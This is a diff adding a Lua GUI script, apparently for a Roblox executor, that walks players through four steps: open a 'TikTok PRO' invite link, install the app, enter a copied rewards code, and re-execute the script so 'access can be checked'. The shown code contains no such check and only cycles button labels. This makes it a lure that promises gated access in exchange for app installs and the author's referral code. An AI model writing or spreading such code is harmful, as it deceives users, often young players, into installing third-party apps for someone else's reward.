+local codeBox = Instance.new("TextLabel")
+codeBox.Size = UDim2.new(0.48, 0, 1, 0)
+codeBox.BackgroundColor3 = C.dim
+codeBox.Font = Enum.Font.GothamBlack
+codeBox.TextSize = 14
+codeBox.Text = REWARD_CODE
+codeBox.TextColor3 = C.cyan2
+codeBox.ZIndex = 14
+codeBox.Parent = codeRow
+corner(codeBox, 8)
+stroke(codeBox, C.cyan, 1, 0.4)
+
+local copyCodeBtn = Instance.new("TextButton")
+copyCodeBtn.Position = UDim2.new(0.52, 0, 0, 0)
+copyCodeBtn.Size = UDim2.new(0.48, 0, 1, 0)
+copyCodeBtn.BackgroundColor3 = C.blue
+copyCodeBtn.AutoButtonColor = false
+copyCodeBtn.Font = Enum.Font.GothamBold
+copyCodeBtn.TextSize = 10
+copyCodeBtn.Text = "COPY CODE"
+copyCodeBtn.TextColor3 = C.text
+copyCodeBtn.ZIndex = 14
+copyCodeBtn.Parent = codeRow
+corner(copyCodeBtn, 8)
+
+-- PROGRESS
+local progressWrap = Instance.new("Frame")
+progressWrap.Position = UDim2.new(0.08, 0, 0.75, 0)
+progressWrap.Size = UDim2.new(0.84, 0, 0, 5)
+progressWrap.BackgroundColor3 = C.dim
+progressWrap.BorderSizePixel = 0
+progressWrap.ZIndex = 12
+progressWrap.Parent = shell
+corner(progressWrap, 3)
+
+local progressFill = Instance.new("Frame")
+progressFill.Size = UDim2.fromScale(0.25, 1)
+progressFill.BackgroundColor3 = C.cyan
+progressFill.BorderSizePixel = 0
+progressFill.ZIndex = 13
+progressFill.Parent = progressWrap
+corner(progressFill, 3)
+
+local dots = Instance.new("Frame")
+dots.BackgroundTransparency = 1
+dots.Position = UDim2.new(0.3, 0, 0.78, 0)
+dots.Size = UDim2.new(0.4, 0, 0, 10)
+dots.ZIndex = 12
+dots.Parent = shell
+local dl = Instance.new("UIListLayout")
+dl.FillDirection = Enum.FillDirection.Horizontal
+dl.HorizontalAlignment = Enum.HorizontalAlignment.Center
+dl.Padding = UDim.new(0, 6)
+dl.Parent = dots
+local dotFrames = {}
+for i = 1, 4 do
+	local d = Instance.new("Frame")
+	d.Size = UDim2.fromOffset(7, 7)
+	d.BackgroundColor3 = i == 1 and C.cyan or C.dim
+	d.BorderSizePixel = 0
+	d.ZIndex = 13
+	d.Parent = dots
+	corner(d, 4)
+	dotFrames[i] = d
+end
+
+-- NAV: BACK | NEXT side by side, full width bottom
+local nav = Instance.new("Frame")
+nav.BackgroundTransparency = 1
+nav.Position = UDim2.new(0.04, 0, 0.84, 0)
+nav.Size = UDim2.new(0.92, 0, 0.1, 0)
+nav.ZIndex = 12
+nav.Parent = shell
+
+local backBtn = Instance.new("TextButton")
+backBtn.Size = UDim2.new(0.4, 0, 0.85, 0)
+backBtn.Position = UDim2.fromScale(0, 0.05)
+backBtn.BackgroundColor3 = C.card2
+backBtn.AutoButtonColor = false
+backBtn.Font = Enum.Font.GothamBold
+backBtn.TextSize = 12
+backBtn.Text = "BACK"
+backBtn.TextColor3 = C.muted
+backBtn.ZIndex = 13
+backBtn.Parent = nav
+corner(backBtn, 10)
+stroke(backBtn, C.border, 1, 0.5)
+
+local nextBtn = Instance.new("TextButton")
+nextBtn.Size = UDim2.new(0.56, 0, 0.85, 0)
+nextBtn.Position = UDim2.fromScale(0.44, 0.05)
+nextBtn.BackgroundColor3 = C.blue
+nextBtn.AutoButtonColor = false
+nextBtn.Font = Enum.Font.GothamBold
+nextBtn.TextSize = 12
+nextBtn.Text = "NEXT STEP"
+nextBtn.TextColor3 = C.text
+nextBtn.ZIndex = 13
+nextBtn.Parent = nav
+corner(nextBtn, 10)
+do
+	local g = Instance.new("UIGradient")
+	g.Color = ColorSequence.new({
+		ColorSequenceKeypoint.new(0, rgb(0, 180, 255)),
+		ColorSequenceKeypoint.new(1, rgb(50, 110, 255)),
+	})
+	g.Parent = nextBtn
+end
+
+local footer = Instance.new("TextLabel")
+footer.BackgroundTransparency = 1
+footer.Position = UDim2.new(0.06, 0, 0.945, 0)
+footer.Size = UDim2.new(0.88, 0, 0.045, 0)
+footer.Font = Enum.Font.Gotham
+footer.TextSize = 8
+footer.TextWrapped = true
+footer.Text = "Tutorial only — access unlocks when eligibility is confirmed."
+footer.TextColor3 = C.muted
+footer.ZIndex = 12
+footer.Parent = shell
+
+-- STEPS
+local STEPS = {
+	{ title = "OPEN THE INVITE LINK", body = "Click the TikTok PRO invite link above. This opens the TikTok PRO invite page.", code = false, ok = false },
+	{ title = "INSTALL TIKTOK PRO", body = "Follow the invite page and install TikTok PRO on your device.", code = false, ok = false },
+	{ title = "ENTER YOUR REWARDS CODE", body = "In TikTok PRO → Rewards, scroll down and enter the code.", code = true, ok = false },
+	{ title = "RE-EXECUTE THE SCRIPT", body = "After install + code, re-execute the script so access can be checked.", code = false, ok = true },
+}
+
+local step = 1
+local busy = false
+
+local function setStep(n)
+	if busy then return end
+	n = math.clamp(n, 1, 4)
+	busy = true
+	step = n
+	local s = STEPS[n]
+	stepBadge.Text = string.format("STEP %02d / 04", n)
+	stepTitle.Text = s.title
+	stepBody.Text = s.body
+	codeRow.Visible = s.code
+	successIcon.Visible = s.ok
+	tween(progressFill, 0.3, { Size = UDim2.fromScale(n / 4, 1) })
+	for i, d in ipairs(dotFrames) do
+		d.BackgroundColor3 = i <= n and C.cyan or C.dim
+	end
+	backBtn.TextColor3 = n == 1 and C.muted or C.text
+	nextBtn.Text = n == 4 and "FINISH" or "NEXT STEP"
+	task.delay(0.15, function() busy = false end)
+end
+
+local function flash(btn, ok, isCode)
+	local orig = btn.Text
+	btn.Text = ok and (isCode and "✓ CODE COPIED!" or "✓ LINK COPIED!") or "COPY UNAVAILABLE"
+	local prev = btn.BackgroundColor3
+	btn.BackgroundColor3 = ok and C.green or rgb(180, 60, 60)
+	task.delay(1.2, function()
+		if btn.Parent then
+			btn.Text = orig
+			btn.BackgroundColor3 = prev
+		end
+	end)
+end
+
+copyLinkBtn.MouseButton1Click:Connect(function()
+	flash(copyLinkBtn, copyText(INVITE_URL), false)
+end)
+linkBox.MouseButton1Click:Connect(function()
+	flash(copyLinkBtn, copyText(INVITE_URL), false)
+end)
+copyCodeBtn.MouseButton1Click:Connect(function()
+	flash(copyCodeBtn, copyText(REWARD_CODE), true)
+end)
+nextBtn.MouseButton1Click:Connect(function()
+	if busy then return end
+	if step < 4 then setStep(step + 1)
+	else
+		nextBtn.Text = "RE-EXECUTE WHEN READY"
+		nextBtn.BackgroundColor3 = C.green
+		task.delay(1.4, function()
+			if nextBtn.Parent then
+				nextBtn.Text = "FINISH"
+				nextBtn.BackgroundColor3 = C.blue
+			end
+		end)
+	end
+end)
+backBtn.MouseButton1Click:Connect(function()
+	if busy or step <= 1 then return end
+	setStep(step - 1)
+end)
+
+task.spawn(function()
+	while linkStroke.Parent do
+		tween(linkStroke, 1.1, { Transparency = 0.12 })
+		task.wait(1.1)
+		tween(linkStroke, 1.1, { Transparency = 0.4 })
+		task.wait(1.1)
+	end
+end)
+
+setStep(1)
+print("[TikTok PRO Access GUI] phone-fit loaded")
